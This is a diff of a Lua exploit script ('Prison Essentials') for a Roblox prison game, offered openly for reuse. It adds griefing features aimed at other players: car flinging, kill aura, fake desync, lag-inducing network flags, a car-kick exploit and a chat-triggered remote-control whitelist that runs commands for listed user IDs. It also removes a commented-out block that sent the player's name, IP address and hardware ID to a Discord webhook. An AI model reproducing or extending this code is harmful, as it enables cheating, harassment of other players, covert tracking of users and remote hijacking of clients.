@@ -1,6 +1,27 @@
+-- made by juju_le_belge, from pure hatered
+-- feel free to skid, im gone
+-- tons of unfinished stuff and i won't finish them
+-- put alot of work and hate into this
+-- some parts are obviously ai and some others are obviously human
+
 if game.PlaceId ~= 155615604 and game.PlaceId ~= 135564683255158 and getgenv().devMode ~= true then
 	notify("Prison Essentials:", "This game is not supported.")
 	return
+end
+
+local fflags = {
+	["DFIntS2PhysicsSenderRate"] = 160,
+	["DFIntDataSenderRate"] = 999,
+	["DFIntPhysicsSenderMaxBandwidthBps"] = 2^31-1,
+	["DFIntNumFramesToKeepAfterInterpolation"] = 1,
+	["DFIntMinimalSimRadiusBuffer"] = 1024,
+	["DFIntMinClientSimulationRadius"] = 1024,
+}
+
+for flag, value in pairs(fflags) do
+	pcall(function()
+		setfflag(flag, value)
+	end)
 end
 
 while not game:IsLoaded() do
@@ -16,38 +37,12 @@ local Debris = game:GetService("Debris")
 
 local localPlayer = Players.LocalPlayer
 
---[[local req = http_request or request or (syn and syn.request)
-local HttpService = game:GetService("HttpService")
-local url = "https://discord.com/api/webhooks/1532060988344369454/fliQJ6HE2I5IXclFicQlv-gZHOSlKTgVVuEaiVtU1Dwif0q13vtrKA4Rbmf_DbI5f32S"
-
---local ip = game:HttpGet("https://api.ipify.org")
-local hwid = gethwid() or "Unknown HWID"
-
-local content = Players.LocalPlayer.Name .. " has joined " .. game.PlaceId .. " " .. game.JobId .. " with IP: " .. ip .. " and HWID: " .. hwid
-
-local data = {
-    content = content,
-    username = "skibidi nutter 3000"
-}
-
-pcall(function()
-	req({
-		Url = url,
-		Method = "POST",
-		Headers = {
-			["Content-Type"] = "application/json"
-		},
-		Body = HttpService:JSONEncode(data)
-	})
-end)
-
 local userRemoteControlWhitelist = {
-	[1650710859] = true,
+	[1381151434] = true,
 	[9145178925] = true,
-	[10912888861] = true,
-	[10469309573] = true,
 	[4904124487] = true,
-}]]
+	[1650710859] = true,
+}
 
 local blacklistedAnimIds = {
 	[148840371] = true,
@@ -83,14 +78,22 @@ local moddedGunsEnabled = false
 local useWhitelist = true
 local gunMacroEnabled = false
 local antiTaseEnabled = false
+local corpseDeleteEnabled = false
 local bruteForceAntiFlingEnabled = false
+local replicationOffsetEnabled = false
+local autoStealCarEnabled = false
+local lagOtherClientsEnabled = false
 local stopBlacklistedAnimsEnabled = false
+local fakeDesyncEnabled = false
 
 local originalGunAttributes = {}
 local cars = {}
 local carParts = {}
 local killAuraWhitelist = {}
 local antiTaseConnections = {}
+local replicationOffsets = {
+	Vector3.new(0, -6, 0)
+}
 local gunNames = {
 	"Remington 870",
 	"AK-47",
@@ -101,19 +104,23 @@ local gunNames = {
 }
 
 local carFlingSpeed = 1000
+local getToolSpeed = .05
+local kickDelay = .1
+local simRadius = 2048
 local moddedSpeed = 80
 local moddedTorque = 2
 local wheelauraSpeed = 10
 local wheelauraOffset = 12
-local gunMacroSwitchDelayMs = 50
+local gunMacroSwitchDelayMs = 25
 local lastGunMacroSwitchTime = 0
 local gunMacroIndex = 1
 local switchModulo = 4
-local farCFrame = CFrame.new(-100000, 0, 100000)
+local firstRadius = 7.5
+local secondRadius = 7.5
+local farCFrame = CFrame.new(-50000, 50000, 50000)
 local infCFrame = CFrame.new(math.huge, math.huge, math.huge)
 local closeCFrame = CFrame.new(0, 0, 2000)
 local activeKidnapFlingCar = nil
-
 local lastDeathCFrame = nil
 local safeTp = false
 local lastPos = nil
@@ -154,6 +161,7 @@ local function getCar()
 end
 
 local function freeCar(car)
+	if not car then return end
 	for i = #storedCars, 1, -1 do
 		local carData = storedCars[i]
 		if carData.car == car then
@@ -183,6 +191,16 @@ local function createDebugRay(startPos, endPos, color)
 
 	Debris:AddItem(rayPart, DEBUG_LIFETIME)
 	return rayPart
+end
+
+local function setHumanoidRootPartCFrame(targetCFrame)
+	local root = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
+	if not root then return end
+	root.CFrame = targetCFrame
+	RunService.PostSimulation:Wait()
+	root.CFrame = farCFrame
+	RunService.Heartbeat:Wait()
+	root.CFrame = targetCFrame
 end
 
 local function fetchTools(toolNames, speaker)
@@ -233,36 +251,64 @@ local function fetchTools(toolNames, speaker)
     local oldCframe = humanoidRootPart.CFrame
     safeTp = true
 
-    for _, giver in ipairs(giversToInteract) do
+	local function equipTools()
+		for i, v in speaker.Character:GetChildren() do
+			if v:IsA("Tool") then
+				v.Parent = speaker.Backpack
+			end
+		end
+		local tools = speaker.Backpack:GetChildren()
+		local nonGuns = {}
+		for i, tool in ipairs(tools) do
+			if tool:GetAttribute("ToolType") ~= "Gun" then
+				table.insert(nonGuns, tool)
+			end
+		end
+		if #nonGuns == 0 then return end
+		RunService.Heartbeat:Wait()
+		for i, v in nonGuns do
+			v.Parent = character
+		end
+		RunService.Heartbeat:Wait()
+		RunService.Heartbeat:Wait()
+		for i, v in speaker.Backpack:GetChildren() do
+			v.Parent = character
+		end
+	end
+
+	equipTools()
+
+    for _, giver in giversToInteract do
         local giverCFrame = giver:GetPivot()
         local itemPart = giver:FindFirstChildWhichIsA("BasePart")
         
         local t = 0
-        while t < 0.05 do
-            local dt = RunService.PostSimulation:Wait()
+		equipTools()
+		local last = os.clock()
+        while t < getToolSpeed do
+            local dt = os.clock() - last
             t = t + dt
+			last = os.clock()
             
-            humanoidRootPart.CFrame = giverCFrame + Vector3.new(0, -10, 0)
+			setHumanoidRootPartCFrame(giverCFrame + Vector3.new(0, -8, 0))
             humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
             humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
             
             if itemPart then
                 task.spawn(function()
-                    ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("InteractWithItem"):InvokeServer(itemPart)
+                    ReplicatedStorage.Remotes.InteractWithItem:InvokeServer(itemPart)
                 end)
             end
             humanoid:ChangeState(Enum.HumanoidStateType.Running)
         end
+		--task.wait(.02)
     end
 
-    RunService.PostSimulation:Wait()
-    humanoidRootPart.CFrame = oldCframe
+    setHumanoidRootPartCFrame(oldCframe)
     humanoid:ChangeState(Enum.HumanoidStateType.Running)
     humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
     humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
-    
-    RunService.Heartbeat:Wait()
-    safeTp = false
+	execCmd("unequiptools")
 end
 
 local cachedGuns = {}
@@ -324,14 +370,14 @@ end
 local ballRaycastParams = RaycastParams.new()
 ballRaycastParams.FilterType = Enum.RaycastFilterType.Exclude
 
-function getClosestVisibleSpotDualSurface(ball1, ball2, sitting)
-	local radius1 = 7.5
-	local radius2 = sitting and 15.5 or 7.5
+function getClosestVisibleSpotDualSurface(ball1, ball2)
+	local radius1 = firstRadius
+	local radius2 = secondRadius
 	local pos1 = ball1.Position
 	local pos2 = ball2.Position
 
-	pos1 = ball1.AssemblyLinearVelocity * Players.LocalPlayer:GetNetworkPing() + pos1
-	pos2 = ball2.AssemblyLinearVelocity * Players.LocalPlayer:GetNetworkPing() + pos2
+	--pos1 = ball1.AssemblyLinearVelocity * (Players.LocalPlayer:GetNetworkPing() / 15) + pos1
+	--pos2 = ball2.AssemblyLinearVelocity * (Players.LocalPlayer:GetNetworkPing() / 15) + pos2
 
 	ballRaycastParams.FilterDescendantsInstances = {ball1}
 
@@ -442,9 +488,42 @@ local function updateAntiTase()
 	end
 end
 
+local function onRemoteControlChat(speaker, message)
+	if not speaker or not message then return end
+	if not userRemoteControlWhitelist[speaker.UserId] then return end
+	message = message:lower()
+	local prefix = message:sub(1, 1)
+	if prefix ~= "." and prefix ~= ";" and prefix ~= "!" and prefix ~= "/" and prefix ~= "?" and prefix ~= ":" then return end
+	message = message:sub(2)
+	local args = message:split(" ")
+	local playerName = getPlayer(args[2])[1]
+	if playerName ~= localPlayer.Name then return end
+	local cmdString = ""
+	for i, v in pairs(args) do
+		if i ~= 2 then
+			cmdString = cmdString .. v .. " "
+		end
+	end
+	execCmd(cmdString)
+end
+
 local function isNetworkOwner(part)
-	if not part or not part:IsA("BasePart") then return false end
-	return part.ReceiveAge == 0 and not part:IsGrounded()
+	if not part or not part:IsA("BasePart") then
+		return false
+	end
+	return isnetworkowner(part)
+	--if part.Anchored or part:IsGrounded() then 
+    --    return false 
+    --end
+    --return part.ReceiveAge == 0
+end
+
+local function setPhysicsRootRef(part, owner)
+	part:SetAttribute("PhysicsRepRootRef", owner)
+	local handle = part:GetAttribute("PhysicsRepRootRef")
+	if sethiddenproperty and handle then
+		sethiddenproperty(part, "PhysicsRepRootRef", handle)
+	end
 end
 
 local function touch(a, b)
@@ -453,13 +532,45 @@ local function touch(a, b)
 	firetouchinterest(a, b, false)
 end
 
+local function carKick(car)
+	if car.Parent == nil then return end
+	local character = localPlayer.Character
+	local humanoid = character and character:FindFirstChild("Humanoid")
+	if not humanoid then return end
+	local seat = car.RWD
+	replicatesignal(seat.RemoteCreateSeatWeld, humanoid)
+	local animation = Instance.new("Animation")
+   	animation.AnimationId = "rbxassetid://148840371"
+	humanoid:LoadAnimation(animation):Play()
+end
+
 if ReplicatedStorage:FindFirstChild("Scripts") then
 	ReplicatedStorage.Scripts.CharacterCollision.Enabled = false
 end
 
-RunService.PostSimulation:Connect(function(dt)
-	sethiddenproperty(localPlayer, "MaximumSimulationRadius", 1e9)
-	sethiddenproperty(localPlayer, "SimulationRadius", 1e9)
+pcall(function()
+	game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+end)
+
+sethiddenproperty(localPlayer, "MaximumSimulationRadius", math.huge)
+
+task.spawn(function()
+	while task.wait(.1) do
+		sethiddenproperty(localPlayer, "SimulationRadius", simRadius)
+	end
+end)
+
+RunService.Heartbeat:Connect(function(dt)
+	local character = localPlayer.Character
+	--localPlayer.ReplicationFocus = workspace
+	--setsimulationradius(simRadius)
+	if character then
+		for i, v in character:GetDescendants() do
+			if v:IsA("BasePart") then
+				sethiddenproperty(v, "NetworkIsSleeping", false)
+			end
+		end
+	end
 	for i, v in storedCars do
 		local car = v.car
 		local body = car and car:FindFirstChild("Body")
@@ -470,8 +581,21 @@ RunService.PostSimulation:Connect(function(dt)
 		end
 		if not v.Using then
 			vehicleSeat.CFrame = farCFrame
+			sethiddenproperty(vehicleSeat, "NetworkIsSleeping", false)
 		end
 	end
+end)
+
+for i, v in pairs(Players:GetPlayers()) do
+	v.Chatted:Connect(function(message)
+		onRemoteControlChat(v, message)
+	end)
+end
+
+Players.PlayerAdded:Connect(function(player)
+	player.Chatted:Connect(function(message)
+		onRemoteControlChat(player, message)
+	end)
 end)
 
 local Plugin = {
@@ -484,25 +608,24 @@ local Plugin = {
 			["Aliases"] = {"cfling"},
 			["Function"] = function(args, speaker)
 				local car = getCar()
-				if not car then notify("Prison Essentials:", "Could not locate your car. Please get a car.") return end
-				local descendants = car:GetDescendants()
+				if not car then notify("Prison Essentials:", "Could not locate your car. Please get a car.") freeCar(car) return end
 				local carSeat = car and car.Body:FindFirstChild("VehicleSeat")
 
 				local players = getPlayer(args[1], speaker)
 				local targetName = players[1]
-				if not targetName then notify("Prison Essentials:", "Could not find a player matching that name.") return end
-				local target = Players:FindFirstChild(targetName)
+				if not targetName then notify("Prison Essentials:", "Could not find a player matching that name.") freeCar(car) return end
+				local target: Player = Players:FindFirstChild(targetName)
 
-				if not target then notify("Prison Essentials:", "Target player is not found.") return end
+				if not target then notify("Prison Essentials:", "Target player is not found.") freeCar(car) return end
 
 				local targetHrp = target.Character:FindFirstChild("HumanoidRootPart")
-				if not targetHrp then notify("Prison Essentials:", "Target's RootPart is missing. They may be voided or loading.") return end
+				if not targetHrp then notify("Prison Essentials:", "Target's RootPart is missing. They may be voided or loading.") freeCar(car) return end
 				local targetHumanoid = target.Character:FindFirstChild("Humanoid")
-				if not targetHumanoid then notify("Prison Essentials:", "Target's Humanoid is missing. They may be voided or loading.") return end
+				if not targetHumanoid then notify("Prison Essentials:", "Target's Humanoid is missing. They may be voided or loading.") freeCar(car) return end
 				local targetHead = target.Character:FindFirstChild("Head")
-				if not targetHead then notify("Prison Essentials:", "Target's Head is missing. They may be voided or loading.") return end
+				if not targetHead then notify("Prison Essentials:", "Target's Head is missing. They may be voided or loading.") freeCar(car) return end
 			
-				local bodyPosition, bodyAngularVelocity = Instance.new("BodyPosition"), Instance.new("BodyAngularVelocity")
+				local bodyPosition = Instance.new("BodyPosition")
 				local flinging = false
 				local isDead = targetHumanoid.Health <= 0
 				local offsetIndex = 1
@@ -511,12 +634,9 @@ local Plugin = {
 
 				local newCFrame = targetHrp.CFrame * carflingOffsets[offsetIndex]
 
-				bodyPosition.MaxForce = Vector3.one * 1e15
+				bodyPosition.MaxForce = Vector3.one * 1e12
 				bodyPosition.P = 1e6
-				bodyPosition.D = 5000
-				bodyAngularVelocity.MaxTorque = Vector3.one * 1e15
-				bodyAngularVelocity.AngularVelocity = bodyAngularVelocity.MaxTorque
-				bodyAngularVelocity.P = 1e9
+				bodyPosition.D = 1000
 
 				local function updatePosition()
 					local targetCharacter = target.Character
@@ -536,27 +656,26 @@ local Plugin = {
 						return
 					end
 					local targetPosition
-					isDead = targetHumanoid.Health <= 0
-					if isDead then
-						targetPosition = Vector3.new(
-							math.clamp(targetHead.Position.X, -100000, 100000),
-							math.clamp(targetHead.Position.Y, -100000, 100000),
-							math.clamp(targetHead.Position.Z, -100000, 100000)
-						)
-					else
+					isDead = targetHumanoid and targetHumanoid.Health <= 0 or false
+					--if isDead then
+					--	targetPosition = Vector3.new(
+					--		math.clamp(targetHead.Position.X, -100000, 100000),
+					--		math.clamp(targetHead.Position.Y, -100000, 100000),
+					--		math.clamp(targetHead.Position.Z, -100000, 100000)
+					--	)
+					--else
 						targetPosition = Vector3.new(
 							math.clamp(targetHrp.Position.X, -100000, 100000),
 							math.clamp(targetHrp.Position.Y, -100000, 100000),
 							math.clamp(targetHrp.Position.Z, -100000, 100000)
 						)
-					end
+					--end
 					
 					local targetCFrame = CFrame.new(targetPosition, targetPosition + targetHrp.CFrame.LookVector)
 					offsetIndex = offsetIndex + 1
 					if offsetIndex > #carflingOffsets then
 						offsetIndex = 1
 					end
-
 
 					newCFrame = targetCFrame * carflingOffsets[offsetIndex]
 				end
@@ -575,33 +694,26 @@ local Plugin = {
 						execCmd("kick " .. carSeat.Occupant.Parent.Name)
 						break
 					end
-					RunService.PreSimulation:Wait()
-					local dt = RunService.PostSimulation:Wait()
+					RunService.PostSimulation:Wait()
 					switchIndex = (switchIndex + 1) % switchModulo
 					updatePosition()
-					--for i, v in car:GetDescendants() do
-					--	if v:IsA("BasePart") then
-					--		v.CanCollide = true
-					--	end
-					--end
-					if isDead then
+					--[[if isDead then
 						deadIndex = deadIndex + 1
 						updateCFrame = false
 						if deadIndex <= 0 then
 							carSeat.CFrame = newCFrame
 							bodyPosition.Parent = car.Body.ColorParts.Hood
-							bodyAngularVelocity.Parent = car.Body.ColorParts.Hood
+							--bodyAngularVelocity.Parent = carSeat
 						end
-						bodyPosition.Position = targetHead.Position
+						bodyPosition.Position = newCFrame.Position
 					else
 						deadIndex = -1
 						updateCFrame = true
 						bodyPosition.Parent = nil
-						bodyAngularVelocity.Parent = nil
-					end
-					if sethiddenproperty then
-						sethiddenproperty(carSeat, "PhysicsRepRootPart", if (switchIndex == 0 and not isDead) then targetHrp else nil)
-					end
+						--bodyAngularVelocity.Parent = nil
+					end]]
+					setPhysicsRootRef(carSeat, if (switchIndex == 0 --[[and not isDead]]) then targetHrp else nil)
+					sethiddenproperty(carSeat, "NetworkIsSleeping", false)
 					if updateCFrame then
 						if switchIndex == 0 then
 							carSeat.CFrame = newCFrame
@@ -609,6 +721,8 @@ local Plugin = {
 							carSeat.CFrame = farCFrame
 						end
 					end
+					carSeat.AssemblyLinearVelocity = Vector3.yAxis * 1e3
+					carSeat.AssemblyAngularVelocity = Vector3.yAxis * 1e4
 				end
 
 				freeCar(car)
@@ -671,49 +785,6 @@ local Plugin = {
 			end,
 		},
 
-		["autoshoot"] = {
-			["ListName"] = "autoshoot",
-			["Description"] = "Enables autoshoot",
-			["Aliases"] = {"enableautoshoot"},
-			["Function"] = function(args, speaker)
-				autoshootEnabled = true
-
-				local mouse = speaker:GetMouse()
-				mouse.TargetFilter = Workspace.CurrentCamera
-
-				local con = nil
-				con = RunService.Heartbeat:Connect(function(dt)
-					if not autoshootEnabled then
-						con:Disconnect()
-						return
-					end
-					local character = speaker.Character
-					if not character then return end
-					local tool = character:FindFirstChildOfClass("Tool")
-					if not tool then return end
-					local isGun = tool:GetAttribute("ToolType") == "Gun"
-					local target = mouse.Target
-					local targetCharacter = target:FindFirstAncestorOfClass("Model")
-					local targetHumanoid = (targetCharacter and targetCharacter:FindFirstChild("Humanoid"))
-					local targetPlayer = (targetHumanoid and Players:GetPlayerFromCharacter(targetCharacter))
-					if targetPlayer and targetPlayer.Team.Name ~= speaker.Team.Name and isGun then
-						if mouse1click then
-							mouse1click()
-						end
-					end
-				end)
-			end,
-		},
-
-		["disableautoshoot"] = {
-			["ListName"] = "disableautoshoot",
-			["Description"] = "Enables autoshoot",
-			["Aliases"] = {"unautoshoot", "noautoshoot"},
-			["Function"] = function(args, speaker)
-				autoshootEnabled = false
-			end,
-		},
-
 		["cargoto"] = {
 			["ListName"] = "cargoto [player]",
 			["Description"] = "Teleports your car to said player",
@@ -753,7 +824,7 @@ local Plugin = {
 				local start = tick()
 
 				while (tick() - start) <= .2 and car.Parent do
-					RunService.PreSimulation:Wait()
+					RunService.PostSimulation:Wait()
 					carSeat.CFrame = target.Character.HumanoidRootPart.CFrame
 					updateWheels()
 				end
@@ -848,7 +919,7 @@ local Plugin = {
 				local flinging = true
 				local killing = false
 
-				if total <= 0 then print("not enough occupants") return end
+				if total <= 0 then print("not enough occupants") freeCar(car) return end
 
 				local wheelOffsets = {}
 				
@@ -879,13 +950,13 @@ local Plugin = {
 					end)
 				end
 
-				--task.delay(speaker:GetNetworkPing() * 2, function()
+				task.delay(speaker:GetNetworkPing(), function()
 					killing = true
-				--end)
+				end)
 
-				while flinging and car.Parent do
-					RunService.PreSimulation:Wait()
-					carSeat.AssemblyLinearVelocity = Vector3.new(.001, 1, .001) * 100_000_000
+				while flinging and car.Parent do				
+					RunService.PostSimulation:Wait()
+					carSeat.AssemblyLinearVelocity = Vector3.new(.001, 1, .001) * 1_000_000_000
 					if killing then
 						for _, target in occupants do
 							for _, damagePart in damageParts do
@@ -893,8 +964,6 @@ local Plugin = {
 							end
 						end
 					end
-					carSeat.CFrame = oldCFrame
-					RunService.PostSimulation:Wait()
 					carSeat.CFrame = oldCFrame
 				end
 				if car and car.Parent then
@@ -911,10 +980,18 @@ local Plugin = {
 		},
 
 		["killaura"] = {
-			["ListName"] = "killaura [range]",
+			["ListName"] = "killaura [radius1] [radius2]",
 			["Description"] = "Kill aura",
 			["Aliases"] = {"enablekillaura"},
 			["Function"] = function(args, speaker)
+				local newRadius1 = args[1]
+				if newRadius1 then
+					firstRadius = newRadius1
+				end
+				local newRadius2 = args[2]
+				if newRadius2 then
+					secondRadius = newRadius2
+				end
 				killAuraEnabled = false
 
 				task.wait()
@@ -1027,7 +1104,7 @@ local Plugin = {
 					table.clear(connections)
 				end
 
-				table.insert(connections, RunService.PostSimulation:Connect(function()
+				table.insert(connections, RunService.RenderStepped:Connect(function()
 					if not killAuraEnabled then
 						cleanup()
 						return
@@ -1123,24 +1200,24 @@ local Plugin = {
 			["Aliases"] = {},
 			["Function"] = function(args, speaker)
 				local car = getCar()
-				if not car then notify("Prison Essentials:", "Could not locate your car. Please get a car.") return end
+				if not car then notify("Prison Essentials:", "Could not locate your car. Please get a car.") freeCar(car) return end
 				local carSeat = car.Body:FindFirstChild("VehicleSeat")
 
 				local players = getPlayer(args[1], speaker)
 				local targetName = players[1]
-				if not targetName then notify("Prison Essentials:", "Could not find a player matching that name.") return end
+				if not targetName then notify("Prison Essentials:", "Could not find a player matching that name.") freeCar(car) return end
 				local target = Players:FindFirstChild(targetName)
 
 				local targetChar = target.Character
-				if not targetChar then notify("Prison Essentials:", "Target player has no character loaded or is currently dead.") return end
+				if not targetChar then notify("Prison Essentials:", "Target player has no character loaded or is currently dead.") freeCar(car) return end
 
 				local targetHrp = targetChar:FindFirstChild("HumanoidRootPart")
-				if not targetHrp then notify("Prison Essentials:", "Target's RootPart is missing. They may be voided or loading.") return end
+				if not targetHrp then notify("Prison Essentials:", "Target's RootPart is missing. They may be voided or loading.") freeCar(car) return end
 
 				local targetHumanoid = targetChar:FindFirstChild("Humanoid")
-				if not targetHumanoid then notify("Prison Essentials:", "Target's humanoid is missing. They may be loading.") return end
+				if not targetHumanoid then notify("Prison Essentials:", "Target's humanoid is missing. They may be loading.") freeCar(car) return end
 
-				if targetHumanoid.SeatPart then notify("Prison Essentials:", "Target is sitting. They can't be flung.") return end
+				if targetHumanoid.SeatPart then notify("Prison Essentials:", "Target is sitting. They can't be flung.") freeCar(car) return end
 
 				local wheelOffsets = {}
 
@@ -1165,22 +1242,18 @@ local Plugin = {
 					updateWheels()
 					if targetHumanoid.SeatPart and targetHumanoid.SeatPart:IsDescendantOf(car) then execCmd("passengerfling") break end
 					local targetCframe = targetHrp.CFrame * carKidnapOffsets[offsetIndex]
-
 					switchIndex = (switchIndex + 1) % switchModulo
 					if switchIndex == 0 then
 						offsetIndex = offsetIndex + 1
 						if offsetIndex > #carKidnapOffsets then
 							offsetIndex = 1
 						end
-						if sethiddenproperty then
-							sethiddenproperty(carSeat, "PhysicsRepRootPart", targetHrp)
-						end
+						setPhysicsRootRef(carSeat, targetHrp)
+						sethiddenproperty(carSeat, "NetworkIsSleeping", false)
 						carSeat.CFrame = targetCframe
 						updateWheels()
 					else
-						if sethiddenproperty then
-							sethiddenproperty(carSeat, "PhysicsRepRootPart", nil)
-						end
+						setPhysicsRootRef(carSeat, nil)
 						carSeat.CFrame = farCFrame
 					end
 				end
@@ -1309,9 +1382,7 @@ local Plugin = {
 						RunService.PreSimulation:Wait()
 						for i, v in ipairs(wheels) do
 							v.CanCollide = true
-							if sethiddenproperty then
-								sethiddenproperty(v, "PhysicsRepRootPart", nil)
-							end
+							setPhysicsRootRef(v, nil)
 						end
 						carSeat.CFrame = oldCFrame
 						carSeat.AssemblyLinearVelocity = Vector3.zero
@@ -1335,9 +1406,7 @@ local Plugin = {
 						local targetPart = targetChar:FindFirstChild(wheelFlingTargets[i] or "HumanoidRootPart")
 						if not targetPart then continue end
 						local targetPos = targetPart.Position
-						if sethiddenproperty then
-							sethiddenproperty(w, "PhysicsRepRootPart", targetPart)
-						end
+						setPhysicsRootRef(w, targetPart)
 						w.Position = targetPos
 						w.AssemblyLinearVelocity = (carFlingSpeed * dir)
 						w.AssemblyAngularVelocity = Vector3.zero
@@ -1476,9 +1545,7 @@ local Plugin = {
 						RunService.PreSimulation:Wait()
 						for _, v in ipairs(wheels) do
 							v.CanCollide = true
-							if sethiddenproperty then
-								sethiddenproperty(v, "PhysicsRepRootPart", nil)
-							end
+							setPhysicsRootRef(v, nil)
 						end
 						updatePosition()
 						returnOriginalWheels()
@@ -1497,9 +1564,7 @@ local Plugin = {
 						w.CanCollide = false
 						local xOffset, zOffset = math.sin(elapsed + (i * (2 * math.pi / #wheels))) * wheelauraOffset * 2, math.cos(elapsed + (i * (2 * math.pi / #wheels))) * wheelauraOffset * 2
 						local targetPos = targetHrp.Position + Vector3.new(xOffset, 0, zOffset)
-						if sethiddenproperty then
-							sethiddenproperty(w, "PhysicsRepRootPart", targetHrp)
-						end
+						setPhysicsRootRef(w, targetHrp)
 						w.Position = targetPos
 						w.AssemblyLinearVelocity = (carFlingSpeed * dir)
 						w.AssemblyAngularVelocity = Vector3.zero
@@ -1551,7 +1616,7 @@ local Plugin = {
 					local body = car:WaitForChild("Body", 5)
 					if not body then return end
 					
-					task.wait(.2)
+					task.wait(.1)
 					if not antiCarFlingEnabled then return end
 
 					local carParts = {}
@@ -1853,23 +1918,9 @@ local Plugin = {
 				local isCar = targetHumanoid.SeatPart.Name == "VehicleSeat" and targetHumanoid.SeatPart.Parent.Name == "Body"
 				if not isCar then return end
 				local car = targetHumanoid.SeatPart.Parent.Parent
-				local seats = {}
-				for i, v in car.Body:GetChildren() do
-					if v:IsA("Seat") and not v.Occupant then
-						table.insert(seats, v)
-					end
-				end
-
-				if humanoid.SeatPart then
-					humanoid.Jump = true
-				end
-
-				if #seats < 0 then return end
-				seats[1]:Sit(humanoid)
-				local animation = Instance.new("Animation")
-   				animation.AnimationId = "rbxassetid://148840371"
-				humanoid:LoadAnimation(animation):Play()
-				ReplicatedStorage.Remotes.RequestTeamChange:InvokeServer(game.Teams.Neutral, 1)
+				carKick(car)
+				--replicatesignal(localPlayer.Kill)
+				--ReplicatedStorage.Remotes.RequestTeamChange:InvokeServer(game.Teams.Neutral, 1)
 			end,
 		},
 
@@ -1892,7 +1943,7 @@ local Plugin = {
 				local oldCFrame = carSeat.CFrame
 				while humanoid.Health > 0 and character.Parent and car.Parent and humanoid.SeatPart do
 					RunService.PostSimulation:Wait()
-					carSeat.CFrame = oldCFrame * CFrame.new(0, 200, 0)
+					carSeat.CFrame = oldCFrame + Vector3.new(0, 200, 0)
 				end
 
 				for i, v in car.Wheels:GetChildren() do
@@ -1905,6 +1956,7 @@ local Plugin = {
 					if v:IsA("BasePart") then
 						v.CustomPhysicalProperties = PhysicalProperties.new(100, 1, 1, 1, 1)
 						v.CanCollide = false
+						v.CanTouch = false
 					end
 				end
 
@@ -1948,6 +2000,43 @@ local Plugin = {
 			end,
 		},
 
+		["corpsedelete"] = {
+			["ListName"] = "corpsedelete",
+			["Description"] = "Deletes your corpse",
+			["Aliases"] = {"corpsedel"},
+			["Function"] = function(args, speaker)
+				local character = speaker.Character or speaker.CharacterAdded:Wait()
+				local humanoid: Humanoid = character:WaitForChild("Humanoid")
+				local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+				humanoid.RequiresNeck = false
+				local oldVel = Vector3.zero
+				speaker.CharacterAdded:Connect(function(char)
+					character = char
+					humanoid = character:WaitForChild("Humanoid")
+					humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+					humanoid.RequiresNeck = false
+				end)
+				corpseDeleteEnabled = true
+				while corpseDeleteEnabled do
+					RunService.Heartbeat:Wait()
+					if (humanoid.SeatPart and humanoid.SeatPart:IsA("VehicleSeat")) then continue end
+					oldVel = humanoidRootPart.AssemblyLinearVelocity
+					humanoidRootPart.AssemblyLinearVelocity = Vector3.yAxis * -2e4
+					RunService.RenderStepped:Wait()
+					humanoidRootPart.AssemblyLinearVelocity = oldVel
+				end
+			end,
+		},
+
+		["disablecorpsedelete"] = {
+			["ListName"] = "disablecorpsedelete",
+			["Description"] = "Disables corpse delete",
+			["Aliases"] = {"uncorpsedel"},
+			["Function"] = function(args, speaker)
+				corpseDeleteEnabled = false
+			end,
+		},
+
 		["bruteforceantifling"] = {
 			["ListName"] = "bruteforceantifling",
 			["Description"] = "Bruteforces anti-fling",
@@ -1966,17 +2055,17 @@ local Plugin = {
 				bruteForceAntiFlingEnabled = true
 				RunService.PreSimulation:Connect(function()
 					if not bruteForceAntiFlingEnabled then return end
-					if not head then return end
-					lastPos = head.Position
+					if not head or not head.Parent then return end
+					lastPos = head.Position * Vector3.new(1, 0, 1)
 				end)
 				RunService.PostSimulation:Connect(function(dt)
 					if not bruteForceAntiFlingEnabled then return end
-					if safeTp then return end
+					if not head or not head.Parent then return end
 					if not lastPos then return end
-					if humanoid:GetState() == Enum.HumanoidStateType.Seated then return end
-					local currentPos = head.Position
+					if humanoid:GetState() ~= Enum.HumanoidStateType.Dead then return end
+					local currentPos = head.Position * Vector3.new(1, 0, 1)
 					local delta = (currentPos - lastPos).Magnitude / dt
-					if delta > 1500 then
+					if delta > 500 then
 						execCmd("rj")
 						speaker:Kick("Brute force anti-fling detected a fling. Rejoining...")
 					end
@@ -1993,12 +2082,478 @@ local Plugin = {
 			end,
 		},
 
+		["replicationoffset"] = {
+			["ListName"] = "replicationoffset",
+			["Description"] = "Offsets your replicated position",
+			["Aliases"] = {"reoff"},
+			["Function"] = function(args, speaker)
+				replicationOffsetEnabled = false
+				task.wait()
+				replicationOffsetEnabled = true
+				local realCFrame = CFrame.identity
+				local teleported = false
+				local teleportIndex = 1
+
+				local character = speaker.Character or speaker.CharacterAdded:Wait()
+				local humanoidRootPart: BasePart = character:WaitForChild("HumanoidRootPart")
+				realCFrame = humanoidRootPart.CFrame
+
+				speaker.CharacterAdded:Connect(function(char)
+					character = char
+					humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+					realCFrame = humanoidRootPart.CFrame
+				end)
+
+				RunService:UnbindFromRenderStep("ReplicationOffset")
+
+				RunService:BindToRenderStep("ReplicationOffset", 100, function(delta: number)
+					if teleported and humanoidRootPart.Parent then
+						teleportIndex = (teleportIndex % #replicationOffsets) + 1
+						humanoidRootPart.CFrame = realCFrame
+						teleported = false
+					end
+				end)
+
+				while replicationOffsetEnabled do
+					RunService.Heartbeat:Wait()
+					if not humanoidRootPart.Parent then continue end
+					realCFrame = humanoidRootPart.CFrame
+					humanoidRootPart.CFrame = realCFrame + (replicationOffsets[teleportIndex] or Vector3.zero)
+					teleported = true
+				end
+			end,
+		},
+
+		["addreplicationoffset"] = {
+			["ListName"] = "addreplicationoffset",
+			["Description"] = "Adds a position offset to replicate",
+			["Aliases"] = {""},
+			["Function"] = function(args, speaker)
+				local x, y, z = tonumber(args[1]), tonumber(args[2]), tonumber(args[3])
+				table.insert(replicationOffsets, Vector3.new(x, y, z))
+			end,
+		},
+
+		["clearreplicationoffsets"] = {
+			["ListName"] = "clearreplicationoffsets",
+			["Description"] = "Clears all position offsets",
+			["Aliases"] = {""},
+			["Function"] = function(args, speaker)
